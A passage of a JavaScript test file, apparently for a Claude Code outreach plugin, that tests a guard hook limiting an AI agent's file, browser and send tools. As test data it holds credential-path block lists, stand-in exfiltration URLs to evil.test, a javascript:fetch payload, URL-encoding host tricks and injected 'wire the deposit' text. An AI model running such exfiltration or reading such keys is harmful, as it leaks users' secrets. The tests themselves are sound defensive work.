// Pre-launch security fixes: Claude's own file tools, the browser during a run and in its windows, the run
// lock's session, the send prompt, the clock, the setup test pass, staging, the writer agent, inbox links,
// outbox links, the release marker, folder permissions, sensitive paths and query placeholders.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync, spawn, execFileSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, readFileSync, existsSync, mkdirSync, statSync, chmodSync, readdirSync, appendFileSync } from 'node:fs';
import { tmpdir, homedir } from 'node:os';
import { join } from 'node:path';
import { setup, cli, triage, idOf, draftApprove, ROOT, NOW, fakeHomeDir } from './fixtures/harness.mjs';
import { check, fileRefusal, recordFile, testPasses, testArgProblems, floorbossScriptCall, fullText } from '../hooks/guard.mjs';
import { isBrowserCall, readUrl, hostAllowed, profileLinkAllowed } from '../lib/security.mjs';
import { notSensitive, sensitiveKind } from '../lib/paths.mjs';
import { verifySend, eventRecord } from '../lib/sendcheck.mjs';
import { loadEvent } from '../lib/event.mjs';
import { renderOutbox } from '../skills/event-outreach/scripts/outbox.mjs';
import { buildBrief } from '../skills/event-outreach/scripts/drafter.mjs';

// These tests save a drafter as the flow does while saving that answer (drafter and drafting_mode are answer-only).
process.env.FLOORBOSS_SAVED_BY = 'drafter';

const RECIPE = { server: 'gmail', tool: 'send_email', args: { to: '{to}', subject: '{subject}', body: '{body}' }, reading: 'x', tool_hash: 'a'.repeat(64), test_draft: { draft_id: 't1', user_confirmed: true } };
const hook = (H, input, { now = NOW, env = {} } = {}) => spawnSync('node', [join(ROOT, 'hooks/guard.mjs')], { input: JSON.stringify(input), env: { ...process.env, FLOORBOSS_HOME: H.HOME, FLOORBOSS_NOW: now, ...env }, encoding: 'utf8' });
const guard = (H, tool_name, tool_input, opts) => hook(H, { tool_name, tool_input, session_id: opts?.session }, opts);
const file = (H, data) => { const f = join(H.dir, `f${Math.random().toString(36).slice(2)}.json`); writeFileSync(f, JSON.stringify(data)); return f; };
const lock = (H, o = {}) => writeFileSync(join(H.HOME, 'active.json'), JSON.stringify({ at: new Date().toISOString(), ...o }));
const RUN = { active: true, until: '2026-10-30T12:00:00.000Z' };
// A run in the session that ran floorboss (the file-tool limits hold there only).
const MINE = { ...RUN, session: true };
// A folder outside the data folder and the temp folder (the tests' own home sits inside the temp folder).
const OUTSIDE = '/opt/floorboss-test/notes.md';

// 1. Commands don't pre-approve unscoped file tools or WebFetch; the guard checks Claude's own file tools.
test('commands: no unscoped Read, Write, Edit, Grep or WebFetch; writes are scoped to the data folder', () => {
  for (const f of readdirSync(join(ROOT, 'commands'))) {
    const fm = readFileSync(join(ROOT, 'commands', f), 'utf8').split('---')[1];
    const tools = JSON.parse(/allowed-tools: (\[.*\])/.exec(fm)[1]);
    for (const t of ['Read', 'Write', 'Edit', 'Grep', 'WebFetch', 'NotebookEdit']) assert.ok(!tools.includes(t), `${f} pre-approves bare ${t}`);
    assert.ok(tools.includes('Write(~/.floorboss/**)') && tools.includes('Edit(~/.floorboss/**)'), `${f}: writes scoped to the data folder`);
    assert.ok(tools.every((t) => !/^(Write|Edit)\(/.test(t) || /^(Write|Edit)\(~\/\.floorboss\/\*\*\)$/.test(t)), `${f}: no other write scope`);
  }
  const hooks = JSON.parse(readFileSync(join(ROOT, 'hooks/hooks.json'), 'utf8')).hooks;
  const matchers = hooks.PreToolUse.map((h) => h.matcher).join('|');
  for (const t of ['Read', 'Grep', 'Glob', 'Write', 'Edit', 'MultiEdit', 'NotebookEdit', 'Bash', 'PowerShell', 'Monitor', 'Agent', 'Task', 'WebFetch', 'WebSearch']) assert.match(matchers, new RegExp(`(^|\\|)${t}(\\||$)`), `the guard sees ${t}`);
  assert.ok(hooks.PreToolUse.some((h) => h.matcher === 'mcp__.*'), 'the guard sees every connected-tool call');
  assert.ok(hooks.PostToolUse?.some((h) => h.matcher === 'mcp__.*'), 'and hears after each one');
  assert.ok(hooks.SessionEnd?.length, 'the guard hears SessionEnd');
});

test('flow: every question names an answer file inside the data folder', () => {
  const H = setup({ attendees: 'Name,Title,Company,Email\nAna Berg,COO,Acme,ana@acme.test\n' });
  const s = cli(H, 'flow', ['next', '--event', H.slug]);
  assert.ok(s.ask, JSON.stringify(s).slice(0, 300));
  assert.equal(s.ask.answer_file, join(H.HOME, 'work', 'answers', `${s.ask.id}.txt`));
  writeFileSync(s.ask.answer_file, "I've read it");
  assert.equal(fileRefusal('Write', { file_path: s.ask.answer_file }, RUN), null, 'the guard lets the answer file be written during a run');
});

test('file tools: keys and credentials are never read; config only outside a run; records only by scripts; writes stay home during a run', () => {
  const H = setup({ attendees: 'Name,Title,Company,Email\nAna Berg,COO,Acme,ana@acme.test\n' });
  process.env.FLOORBOSS_HOME = H.HOME;
  const hh = homedir();
  for (const p of ['.ssh/id_ed25519', '.aws/credentials', '.zsh_history', '.bash_history', '.pgpass', '.vault-token', '.cargo/credentials.toml', 'Library/Application Support/Google/Chrome/Default/Login Data', '.env']) {
    assert.match(fileRefusal('Read', { file_path: join(hh, p) }) || '', /keys, credentials or private history/, p);
    assert.match(fileRefusal('Grep', { pattern: 'x', path: join(hh, p) }) || '', /keys, credentials/, `Grep ${p}`);
  }
  assert.match(fileRefusal('Glob', { pattern: `${hh}/.ssh/*` }) || '', /keys, credentials/, 'Glob into ~/.ssh');
  assert.match(fileRefusal('Write', { file_path: join(hh, '.ssh/authorized_keys'), content: 'x' }) || '', /doesn't let Claude write/);
  // Configuration: only while a run is under way, and never the agents and skills floorboss's scan reads.
  assert.equal(fileRefusal('Read', { file_path: join(hh, '.claude/settings.json') }), null, 'outside a run, the user\'s business');
  assert.match(fileRefusal('Read', { file_path: join(hh, '.claude/settings.json') }, MINE) || '', /configuration, and a floorboss run is under way/);
  assert.equal(fileRefusal('Read', { file_path: join(hh, '.claude/settings.json') }, RUN), null, 'another session keeps its reads');
  assert.equal(fileRefusal('Read', { file_path: join(hh, '.claude/agents/sdr.md') }, MINE), null);
  assert.equal(fileRefusal('Read', { file_path: join(hh, '.claude/projects/p/tool-results/x.txt') }, MINE), null, 'Claude\'s own session files');
  assert.equal(fileRefusal('Read', { file_path: join(ROOT, 'skills/flow/SKILL.md') }, MINE), null, 'the plugin\'s own files');
  // floorboss's records: never by Claude's Write or Edit, run or not.
  for (const p of ['config.json', 'browser-send.json', 'test-pending.json', join('events', H.slug, 'ledger.jsonl'), join('events', H.slug, 'stage-list.json'), join('events', H.slug, 'derived', 'send-list.json'), join('events', H.slug, 'drafts', 'abc.json')]) {
    assert.ok(recordFile(join(H.HOME, p)), p);
    assert.match(fileRefusal('Edit', { file_path: join(H.HOME, p), old_string: 'a', new_string: 'b' }) || '', /floorboss's own records/, p);
  }
  for (const p of [join('work', 'answers', 'gate.txt'), join('events', H.slug, 'work', 'fits.json'), join('events', H.slug, 'attendees.csv'), join('context', 'buyers', 'voice', 'SKILL.md')]) assert.equal(fileRefusal('Write', { file_path: join(H.HOME, p) }, MINE), null, p);
  // During a run: nothing outside the data folder and the temp folder.
  assert.match(fileRefusal('Write', { file_path: OUTSIDE }, MINE) || '', /outside floorboss's data folder/);
  assert.equal(fileRefusal('Write', { file_path: OUTSIDE }), null, 'outside a run, the user\'s business');
  assert.equal(fileRefusal('Write', { file_path: OUTSIDE }, RUN), null, 'another session, during the lock\'s 30 minutes, keeps its writes');
  assert.equal(fileRefusal('Write', { file_path: join(tmpdir(), 'x.json') }, MINE), null);
  assert.equal(fileRefusal('Write', { file_path: '/tmp/fb-x.json' }, MINE), null);
  assert.match(fileRefusal('NotebookEdit', { notebook_path: '/opt/floorboss-test/n.ipynb' }, MINE) || '', /outside floorboss's data folder/);
  // Ordinary development: an .env.example, a Keynote file; a secret written outside a run is the user's call.
  assert.equal(fileRefusal('Write', { file_path: '/opt/floorboss-test/app/.env.example' }), null);
  assert.equal(fileRefusal('Read', { file_path: '/opt/floorboss-test/talk.key' }), null);
  assert.equal(fileRefusal('Write', { file_path: '/opt/floorboss-test/app/.env' }), null);
  assert.match(fileRefusal('Write', { file_path: '/opt/floorboss-test/app/.env' }, MINE) || '', /keys, credentials/);
  assert.match(fileRefusal('Read', { file_path: '/opt/floorboss-test/app/.env' }) || '', /keys, credentials/);
  // Searches that would reach keys: by name anywhere, over the home folder while floorboss runs here.
  assert.match(fileRefusal('Glob', { pattern: '**/.ssh/*' }) || '', /keys, credentials/);
  assert.match(fileRefusal('Grep', { pattern: 'aws_secret_access_key', path: hh }, MINE) || '', /would reach keys/);
  assert.match(fileRefusal('Grep', { pattern: 'x', path: '/' }, MINE) || '', /would reach keys/);
  assert.equal(fileRefusal('Grep', { pattern: 'x', path: join(hh, 'project') }, MINE), null);
  // As a hook: a read of a key is refused with exit 2, Claude's other reads pass.
  const r = guard(H, 'Read', { file_path: join(hh, '.ssh', 'id_rsa') });
  assert.equal(r.status, 2);
  assert.match(r.stderr, /floorboss blocked this call/);
  assert.equal(guard(H, 'Read', { file_path: join(H.dir, 'event.json') }).status, 0);
  // A symlink inside the data folder that points at a key is the key.
  // Written only into the temp home the test preload set up, never a real one.
  const fake = fakeHomeDir();
  mkdirSync(join(fake, '.ssh'), { recursive: true }); writeFileSync(join(fake, '.ssh', 'id_rsa'), 'k');
  execFileSync('ln', ['-s', join(fake, '.ssh', 'id_rsa'), join(H.HOME, 'work-link')]);
  assert.match(fileRefusal('Read', { file_path: join(H.HOME, 'work-link') }) || '', /keys, credentials/);
});

// 2. During a run the browser opens only pages floorboss has a reason to; generic tools and links wait.
test('run: the browser opens only LinkedIn profiles, known event apps, CRM web apps and the event\'s site', () => {
  const nav = (url, hosts = []) => check({ tool_name: 'mcp__claude-in-chrome__navigate', tool_input: { url } }, { config: {}, active: RUN, hosts });
  assert.equal(nav('https://www.linkedin.com/in/ana-berg-example/'), null);
  assert.equal(nav('https://app.grip.events/x/profile/1'), null);
  assert.equal(nav('https://app.hubspot.com/contacts/search?q=a'), null);
  assert.equal(nav('https://expo.example/speakers', ['expo.example']), null, 'the event\'s own site');
  assert.match(nav('https://evil.test/?d=secret') || '', /opens only LinkedIn profiles/);
  assert.match(nav('https://www.linkedin.com/feed/') || '', /opens only/, 'LinkedIn, but not a profile');
  assert.match(nav('javascript:fetch("https://evil.test")') || '', /javascript: address/);
  assert.match(nav('https://evil.test%2F%40www.linkedin.com/in/x') || '', /opens only|email address/, 'an encoded slash and at sign are read as the browser reads it');
  // The host is the one the browser goes to: encoded characters, an @ or a backslash before it never pass.
  for (const u of ['https://www.brella.io%2f@evil.test/x?d=secret', 'https://brella.io%23@evil.test/', 'https://brella.io%3F@evil.test/', 'https://linkedin.com%2fin%2fx@evil.test/', 'https://a' + '@app.brella.io/', 'https:\\\\evil.test\\@app.brella.io', 'https%3A%2F%2Fapp.brella.io%2F']) assert.match(nav(u) || '', /opens only|isn't a web address|email address/, u);
  assert.equal(check({ tool_name: 'mcp__claude-in-chrome__navigate', tool_input: { url: 'https://evil.test/' } }, { config: {}, active: false }), null, 'outside a run, the user\'s business');
  // An event's list link is allowed through the hook only once the user gave it as their answer (site_allowed);
  // a link written into event.json is not enough.
  const H = setup({ attendees: 'Name,Title,Company,Email\nAna Berg,COO,Acme,ana@acme.test\n', event: { list_url: 'https://www.harbourhaul.example/attendees' } });
  lock(H);
  assert.equal(guard(H, 'mcp__claude-in-chrome__navigate', { url: 'https://harbourhaul.example/attendees?page=2' }).status, 2, 'event.json alone lets nothing in');
  // The entry the flow's list_source answer writes (only while that question is asked: security-round3).
  appendFileSync(join(H.dir, 'ledger.jsonl'), `${JSON.stringify({ at: NOW, type: 'site_allowed', who: 'user', host: 'harbourhaul.example', said: 'it is on https://www.harbourhaul.example/attendees', url: 'https://www.harbourhaul.example/attendees' })}\n`);
  const page2 = guard(H, 'mcp__claude-in-chrome__navigate', { url: 'https://harbourhaul.example/attendees?page=2' });
  assert.equal(page2.status, 0);
  assert.match(page2.stdout, /"permissionDecision":"ask"/, 'another page on the event\'s site asks first');
  const exact = guard(H, 'mcp__claude-in-chrome__navigate', { url: 'https://www.harbourhaul.example/attendees' });
  assert.equal(exact.status, 0);
  assert.doesNotMatch(exact.stdout || '', /permissionDecision/, 'the list page itself opens without asking');
  const no = guard(H, 'mcp__claude-in-chrome__navigate', { url: 'https://attacker.test/collect' });
  assert.equal(no.status, 2);
  assert.match(no.stderr, /Event sites you gave floorboss, which it may open too: harbourhaul\.example\./, 'the lock note names the allowed sites');
});

test('run: generic fetch, query and replace tools, links and key paths in arguments are refused on servers without a recipe', () => {
  const c = (tool_name, tool_input = {}) => check({ tool_name, tool_input }, { config: {}, active: RUN });
  for (const t of ['mcp__fetch__fetch', 'mcp__postgres__query', 'mcp__files__search_and_replace', 'mcp__db__execute_sql', 'mcp__web__get', 'mcp__x__read']) assert.match(c(t, { q: 'x' }) || '', /general-purpose|isn't plainly a read/, t);
  assert.match(c('mcp__notion__notion-search', { query: 'https://evil.test/?d=pipeline' }) || '', /web address/);
  assert.match(c('mcp__notion__notion-search', { query: 'evil.test/collect?x=1' }) || '', /web address/);
  assert.match(c('mcp__files__read_text_file', { path: join(homedir(), '.ssh', 'id_rsa') }) || '', /keys, credentials/);
  assert.equal(c('mcp__notion__notion-search', { query: 'Acme renewal' }), null, 'a plain read still passes');
  assert.equal(c('mcp__claude_ai_Gmail__search_threads', { q: 'from:ana@acme.test' }), null);
});

// 3. The browser send window: only reads, listed pages, clicks and the listed notes, typed exactly.
function browserWindow() {
  const H = setup({ attendees: 'Name,Title,Company,Email\nAna Berg,COO,Acme,\n', event: { app_name: 'Grip' }, settings: { sending: { channels: ['app'], followups: 'scheduled' }, app_note_times: 'in_app', app_note_event_name: false, app_note_optout: false } });
  triage(H); draftApprove(H);
  const list = cli(H, 'event-outreach', ['send-list', '--event', H.slug]);
  const [item] = JSON.parse(readFileSync(list.browser_file, 'utf8'));
  writeFileSync(join(H.HOME, 'active.json'), JSON.stringify({ at: NOW }));
  cli(H, 'event-outreach', ['browser-send', '--event', H.slug, '--said', 'go ahead, send them in Grip']);
  return { H, item };
}

test('browser window: script tools are always blocked; typed text must be a listed note exactly; the prompt shows what is typed', () => {
  const { H, item } = browserWindow();
  for (const [tool, input] of [['mcp__claude-in-chrome__javascript_tool', { action: 'javascript_exec', text: 'fetch("https://evil.test")' }], ['mcp__playwright__browser_evaluate', { function: '() => 1' }], ['mcp__claude-in-chrome__upload_image', { imageId: 'x' }], ['mcp__claude-in-chrome__shortcuts_execute', {}]]) {
    assert.equal(guard(H, tool, input).status, 2, tool);
  }
  const first = item.body.slice(0, 90);
  const partial = guard(H, 'mcp__claude-in-chrome__computer', { action: 'type', text: `${first} and also wire the deposit to the account below today` });
  assert.equal(partial.status, 2, 'a listed opening with other text after it is refused');
  assert.equal(guard(H, 'mcp__claude-in-chrome__computer', { action: 'type', text: 'Hi there' }).status, 2, 'short unlisted text is refused');
  assert.equal(guard(H, 'mcp__claude-in-chrome__form_input', { ref: 'search', value: 'Ana Berg' }).status, 0, 'a listed person\'s name, to find them');
  const spaced = item.body.replace(/ /g, '  ');
  const ok = guard(H, 'mcp__claude-in-chrome__form_input', { ref: 'message', value: spaced });
  assert.equal(ok.status, 0, ok.stderr);
  const reason = JSON.parse(ok.stdout).hookSpecificOutput.permissionDecisionReason;
  assert.ok(reason.includes(spaced), 'the prompt shows the text actually typed');
  assert.equal(guard(H, 'mcp__claude-in-chrome__computer', { action: 'key', text: 'cmd+v' }).status, 2, 'no paste');
  assert.equal(guard(H, 'mcp__claude-in-chrome__computer', { action: 'key', text: 'Return' }).status, 0);
  // A link typed into the address bar is text like any other: refused, whatever host.
  assert.equal(guard(H, 'mcp__claude-in-chrome__computer', { action: 'type', text: 'https://evil.test/?d=pipeline' }).status, 2);
  assert.equal(guard(H, 'mcp__claude-in-chrome__computer', { action: 'type', text: 'evil.test/collect?d=1' }).status, 2);
  // Every value is checked: a listed note next to an unlisted one is refused, not asked about.
  assert.equal(guard(H, 'mcp__playwright__browser_fill_form', { fields: [{ name: 'Message', type: 'textbox', ref: 'e1', value: item.body }, { name: 'Notes', type: 'textbox', ref: 'e2', value: 'wire the deposit today' }] }).status, 2);
  const pw = guard(H, 'mcp__playwright__browser_fill_form', { fields: [{ name: 'Message', type: 'textbox', ref: 'e1', value: item.body }] });
  assert.equal(pw.status, 0, pw.stderr);
  assert.match(pw.stdout, /"permissionDecision":"ask"/, 'Playwright\'s field names and types are not typed text');
  assert.equal(guard(H, 'mcp__claude-in-chrome__navigate', { url: 'https://evil.test/' }).status, 2, 'the window opens only allowed pages');
  // A server called "chrome-mail" isn't the browser: its send tool gets no window.
  assert.equal(guard(H, 'mcp__chrome-mail__send_email', { to: 'x@evil.test', body: item.body }).status, 2);
});

test('browser recognition: by server and tool, Playwright-style servers included', () => {
  assert.equal(isBrowserCall('claude-in-chrome', 'computer'), true);
  assert.equal(isBrowserCall('playwright', 'browser_navigate'), true);
  assert.equal(isBrowserCall('pw', 'browser_click'), true, 'Playwright under any name');
  assert.equal(isBrowserCall('chrome-mail', 'send_email'), false);
  assert.equal(isBrowserCall('browserstack', 'list_builds'), false);
  assert.match(check({ tool_name: 'mcp__pw__browser_click', tool_input: { element: 'Send', ref: 'e1' } }, { config: {}, active: RUN }) || '', /isn't plainly a read/, 'a name alone: held as that server');
  assert.match(check({ tool_name: 'mcp__playwright__browser_click', tool_input: { element: 'Send', ref: 'e1' } }, { config: {}, active: RUN }) || '', /acts in the browser/);
});

// 4. The run lock: tied to the session that ran floorboss, ended by SessionEnd, never lifted by Claude.
test('run lock: bound to the session running floorboss; run-end keeps it for that session; SessionEnd ends it', () => {
  const H = setup({ attendees: 'Name,Title,Company,Email\nAna Berg,COO,Acme,ana@acme.test\n' });
  writeFileSync(join(H.HOME, 'config.json'), JSON.stringify({ connectors: { 'crm.lookup': { server: 'crm', tool: 'search_contacts', args: { query: '{email}' } } } }));
  assert.equal(floorbossScriptCall(`node "${ROOT}/skills/flow/scripts/cli.mjs" next --event x`).sub, 'next');
  assert.equal(floorbossScriptCall('ls -la'), null);
  hook(H, { tool_name: 'Bash', session_id: 'sess-a', tool_input: { command: `node "${ROOT}/skills/flow/scripts/cli.mjs" next --event ${H.slug}` } });
  cli(H, 'flow', ['next', '--event', H.slug]);
  assert.ok(JSON.parse(readFileSync(join(H.HOME, 'active.json'), 'utf8')).sessions['sess-a'], 'the session is named in the lock');
  cli(H, 'connectors', ['run-end']);
  assert.ok(existsSync(join(H.HOME, 'active.json')), 'run-end doesn\'t lift it for the session that read the run');
  const a = guard(H, 'mcp__crm__delete_contact', { id: '1' }, { session: 'sess-a' });
  assert.equal(a.status, 2);
  assert.match(a.stderr, /\/clear or a new session lifts it/);
  assert.doesNotMatch(a.stderr, /delete \S*active\.json/);
  assert.equal(guard(H, 'mcp__crm__delete_contact', { id: '1' }, { session: 'sess-b' }).status, 0, 'another session isn\'t held after run-end');
  assert.match(fileRefusal('Write', { file_path: OUTSIDE }, MINE) || '', /outside/);
  hook(H, { hook_event_name: 'SessionEnd', session_id: 'sess-a', reason: 'clear' });
  assert.equal(existsSync(join(H.HOME, 'active.json')), false, 'the lock goes with the session');
  assert.equal(guard(H, 'mcp__crm__delete_contact', { id: '1' }, { session: 'sess-a' }).status, 0);
});

// 5. Gates take the user's words; the send prompt shows the whole message.
test('gates: no answer is never "approve all" or "ok"', () => {
  const H = setup({ attendees: 'Name,Title,Company,Email\nAna Berg,COO,Acme,ana@acme.test\n' });
  const load = cli(H, 'crm-triage', ['load', '--event', H.slug]);
  writeFileSync(join(H.dir, 'fits.json'), JSON.stringify(load.needs_fit.map((r) => ({ id: r.id, segment: 'ops-leaders', reason: 'x', score: 80 }))));
  cli(H, 'crm-triage', ['fit', '--event', H.slug, '--fits-file', join(H.dir, 'fits.json')]);
  assert.match(cli(H, 'crm-triage', ['gate', '--event', H.slug]).ERROR, /needs the user's answer/);
  assert.match(cli(H, 'crm-triage', ['gate', '--event', H.slug, '--answers', ' ']).ERROR, /needs the user's answer/);
  assert.equal(cli(H, 'crm-triage', ['gate', '--event', H.slug, '--answers', 'ok']).ERROR, undefined);
  const { gate } = draftApprove(H);
  assert.equal(gate.ERROR, undefined, 'with the user\'s words, the draft gate approves');
  assert.match(cli(H, 'event-outreach', ['gate', '--event', H.slug]).ERROR, /needs the user's answer/);
  assert.match(cli(H, 'event-outreach', ['gate', '--event', H.slug, '--answers', '']).ERROR, /needs the user's answer/);
  const led = readFileSync(join(H.dir, 'ledger.jsonl'), 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l));
  assert.ok(led.filter((e) => e.type === 'approved').every((e) => e.said === 'approve all'), 'every approval carries the words given');
});

test('send prompt: the whole subject and body, and the recipient the call carries', () => {
  const long = 'Long line about dock schedules that keeps going. '.repeat(40);
  const H = setup({ attendees: 'Name,Title,Company,Email\nAna Berg,COO,Acme,ana@acme.test\n', settings: { sending: { channels: ['email'], followups: 'scheduled', linkedin_ack: false } } });
  writeFileSync(join(H.HOME, 'config.json'), JSON.stringify({ connectors: { 'email.send': RECIPE } }));
  triage(H); draftApprove(H);
  const list = cli(H, 'event-outreach', ['send-list', '--event', H.slug]);
  const [it] = JSON.parse(readFileSync(list.file, 'utf8'));
  const g = guard(H, 'mcp__gmail__send_email', { to: it.to, subject: it.subject, body: it.body });
  assert.equal(g.status, 0, g.stderr);
  const reason = JSON.parse(g.stdout).hookSpecificOutput.permissionDecisionReason;
  assert.ok(reason.includes(`Subject: ${it.subject}`), 'the subject');
  assert.ok(reason.includes(it.body.trim().slice(0, 1400)), 'the body, not one line of it');
  assert.match(reason, /"ana@acme\.test"/);
  // Capped at 1,500 characters, saying how much more there is.
  const t = fullText('S', long);
  assert.ok(t.length < 1600 && /more characters\)$/.test(t));
});

// 6. The clock: --now only under tests; nothing dated ahead of the clock counts.
test('clock: --now is refused outside floorboss\'s tests; future-dated windows and reply checks don\'t count', () => {
  const H = setup({ attendees: 'Name,Title,Company,Email\nAna Berg,COO,Acme,ana@acme.test\n' });
  const env = { ...process.env, FLOORBOSS_HOME: H.HOME };
  delete env.FLOORBOSS_TEST;
  const r = spawnSync('node', [join(ROOT, 'skills/flow/scripts/cli.mjs'), 'next', '--event', H.slug, '--now', '2030-01-01T00:00:00Z'], { env, encoding: 'utf8' });
  assert.notEqual(r.status, 0);
  assert.match(r.stderr, /--now is for floorboss's own tests only/);
  assert.equal(spawnSync('node', [join(ROOT, 'skills/flow/scripts/cli.mjs'), 'next', '--event', H.slug, '--now', NOW], { env: { ...env, FLOORBOSS_TEST: '1' }, encoding: 'utf8' }).status, 0);
  // A browser window "opened" in the future stays shut.
  const { H: B } = browserWindow();
  const ledger = join(B.dir, 'ledger.jsonl');
  const lines = readFileSync(ledger, 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l));
  const later = new Date(Date.parse(NOW) + 3600e3).toISOString(), until = new Date(Date.parse(NOW) + 3600e3 + 15 * 60e3).toISOString();
  writeFileSync(ledger, lines.map((e) => JSON.stringify(e.type === 'browser_send_opened' ? { ...e, at: later, until } : e)).join('\n') + '\n');
  writeFileSync(join(B.HOME, 'browser-send.json'), JSON.stringify({ ...JSON.parse(readFileSync(join(B.HOME, 'browser-send.json'), 'utf8')), until }));
  assert.equal(guard(B, 'mcp__claude-in-chrome__computer', { action: 'left_click' }).status, 2, 'a window dated an hour ahead is no window');
});

test('clock: a reply check dated in the future doesn\'t clear a follow-up', () => {
  const H = setup({ attendees: 'Name,Title,Company,Email\nAna Berg,COO,Acme,ana@acme.test\n', settings: { sending: { channels: ['email'], followups: 'scheduled', linkedin_ack: false }, touches: 3 } });
  writeFileSync(join(H.HOME, 'config.json'), JSON.stringify({ connectors: { 'email.send': RECIPE, 'email.messages': { server: 'gmail', tool: 'list_messages', args: { q: '{email}' } } } }));
  triage(H); draftApprove(H);
  const ana = idOf(H, 'Ana Berg');
  const at = '2026-10-12T08:01:00.000Z';
  writeFileSync(join(H.dir, 'ledger.jsonl'), readFileSync(join(H.dir, 'ledger.jsonl'), 'utf8') + [
    { at, type: 'sent', who: 'guard', id: ana, touch: 1, via: 'email.send', message_id: 'm1', date: '2026-10-12' },
    { at: '2026-10-15T08:00:00.000Z', type: 'reply_checked', who: 'mailbox', id: ana, source: 'mailbox' }].map((x) => JSON.stringify(x)).join('\n') + '\n');
  process.env.FLOORBOSS_HOME = H.HOME;
  const { settings } = loadEvent(H.slug);
  const rec = eventRecord(H.dir);
  const r = verifySend({ id: ana, touch: 2, via: 'email.send', to: 'ana@acme.test', subject: 'x', body: 'y' }, { evDir: H.dir, settings: { ...settings, connectors: { 'email.messages': {} } }, ...rec, nowMs: Date.parse('2026-10-14T08:00:00Z') });
  assert.equal(r.ok, false);
  assert.match(r.why, /dated in the future/);
});

// 7. The setup test pass: the recipe's argument shape, and a prompt every time.
test('setup test: the call has the recipe shape (no bcc, no extra keys), and every test task asks', () => {
  const pending = { task: 'stage_draft', server: 'gmail', tool: 'create_draft', to: 'me@own.test', at: NOW };
  const now = Date.parse(NOW);
  assert.equal(testPasses({ tool_name: 'mcp__gmail__create_draft', tool_input: { to: 'me@own.test', subject: 's', body: 'b' } }, pending, now), true);
  assert.equal(testPasses({ tool_name: 'mcp__gmail__create_draft', tool_input: { to: 'me@own.test', subject: 's', body: 'b', share_with: 'me@own.test' } }, pending, now), false, 'an extra key');
  assert.ok(testArgProblems('crm.create_task', { title: 't', body: 'b', webhook_url: 'x' }).length, 'a task with a webhook');
  assert.equal(testArgProblems('crm.create_task', { properties: { hs_task_subject: 't', hs_task_body: 'b', hs_task_type: 'TODO' } }).length, 0);
  const H = setup({ attendees: 'Name,Title,Company,Email\nAna Berg,COO,Acme,ana@acme.test\n' });
  writeFileSync(join(H.HOME, 'test-pending.json'), JSON.stringify({ task: 'crm.create_task', server: 'crm', tool: 'create_task', to: null, at: NOW }));
  const g = guard(H, 'mcp__crm__create_task', { title: 'floorboss test task', body: 'delete me' });
  assert.equal(g.status, 0, g.stderr);
  assert.match(JSON.parse(g.stdout).hookSpecificOutput.permissionDecisionReason, /TEST task in your CRM.*\n.*title: floorboss test task/s);
});

// 8. Staging a draft: the record is checked again, as for a send.
test('staging: a stop, a reply or an old listing stops a draft going into the mailbox', () => {
  const H = setup({ attendees: 'Name,Title,Company,Email\nAna Berg,COO,Acme,ana@acme.test\n' });
  writeFileSync(join(H.HOME, 'config.json'), JSON.stringify({ connectors: { stage_draft: { ...RECIPE, tool: 'create_draft', tool_hash: 'd'.repeat(64) } } }));
  triage(H); draftApprove(H);
  const sl = cli(H, 'event-outreach', ['stage-list', '--event', H.slug]);
  const [it] = JSON.parse(readFileSync(sl.file, 'utf8'));
  assert.ok(it.listed_at, 'listed with its time');
  const call = { to: it.to, subject: it.subject, body: it.body };
  assert.equal(guard(H, 'mcp__gmail__create_draft', call).status, 0);
  const late = guard(H, 'mcp__gmail__create_draft', call, { now: new Date(Date.parse(NOW) + 31 * 60e3).toISOString() });
  assert.equal(late.status, 2);
  assert.match(late.stderr, /listed in the last 30 minutes/);
  writeFileSync(join(H.dir, 'ledger.jsonl'), `${readFileSync(join(H.dir, 'ledger.jsonl'), 'utf8')}${JSON.stringify({ at: NOW, type: 'stop', who: 'user', id: it.id, said: 'remove me' })}\n`);
  const stopped = guard(H, 'mcp__gmail__create_draft', call);
  assert.equal(stopped.status, 2);
  assert.match(stopped.stderr, /can't be staged now: they said stop/);
});

// 9. The writer agent has no file tool; the user's instructions travel inside the brief.
test('outreach-writer: Glob only, with the instructions inline in the brief; README and SECURITY say so', () => {
  const md = readFileSync(join(ROOT, 'agents/outreach-writer.md'), 'utf8');
  assert.match(md, /^tools: Glob$/m);
  const brief = buildBrief({ kind: 'message', channel: 'email', contact: { name: 'Ana Berg', title: 'COO', company: 'Acme' }, drafter: { instructions: '/x/sdr.md' } }, { event: { name: 'Expo', city: 'Rotterdam', start_date: '2026-11-10', end_date: '2026-11-12' }, settings: {}, files: { instructions: 'Open with a question.\nSign off as Sam.' } });
  assert.match(brief, /<<<INSTRUCTIONS\n> Open with a question\.\n> Sign off as Sam\.\nINSTRUCTIONS>>>/);
  assert.doesNotMatch(brief, /read \/x\/sdr\.md/);
  // End to end: the briefs command reads the user's instructions file and quotes it in each brief.
  const H = setup({ attendees: 'Name,Title,Company,Email\nAna Berg,COO,Acme,ana@acme.test\n' });
  mkdirSync(join(H.HOME, 'proj', '.claude', 'agents'), { recursive: true });
  const agentFile = join(H.HOME, 'proj', '.claude', 'agents', 'sdr-agent.md');
  writeFileSync(agentFile, '---\nname: sdr-agent\n---\nAlways open with a question about dock queues.');
  assert.equal(cli(H, 'event-context', ['config', '--set', JSON.stringify({ drafting_mode: 'delegate', drafter: { invoke: 'sdr-agent', type: 'instructions', path: agentFile } })]).ERROR, undefined);
  triage(H);
  cli(H, 'event-outreach', ['todo', '--event', H.slug]);
  const b = cli(H, 'event-outreach', ['briefs', '--event', H.slug]);
  assert.ok(b.by_drafter?.length, JSON.stringify(b).slice(0, 300));
  assert.equal(b.by_drafter[0].drafter, 'floorboss:outreach-writer');
  const text = readFileSync(b.by_drafter[0].brief_file, 'utf8');
  assert.match(text, /<<<INSTRUCTIONS[\s\S]*> Always open with a question about dock queues\.[\s\S]*INSTRUCTIONS>>>/);
  const readme = readFileSync(join(ROOT, 'README.md'), 'utf8');
  assert.doesNotMatch(readme, /the reader can't/);
  assert.match(readme, /outreach writer/i);
  assert.match(readFileSync(join(ROOT, 'SECURITY.md'), 'utf8'), /writer/);
});

// 10. Inbox links however they are spelled; Playwright's navigate is the browser's.
test('inbox: percent-encoded, doubled-slash and upper-case LinkedIn messaging links are refused; so is Playwright\'s', () => {
  const c = (tool_name, url) => check({ tool_name, tool_input: { url } }, { config: {} });
